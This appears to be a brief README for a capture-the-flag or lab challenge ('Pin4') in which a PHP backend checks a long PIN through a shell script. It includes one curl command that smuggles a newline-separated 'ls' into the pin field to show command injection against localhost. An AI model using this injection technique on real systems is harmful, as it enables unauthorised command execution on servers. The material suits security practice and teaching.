## Pin4
Now with long PIN code - 22 digits!

Backend verifies PIN towards a shellscript. PHP/Script combo is vulnerable to command injections.

  curl 'http://localhost:36964/api/checkpin' -H 'Content-Type: application/x-www-form-urlencoded'  --data-raw 'pin=22%0Als' 

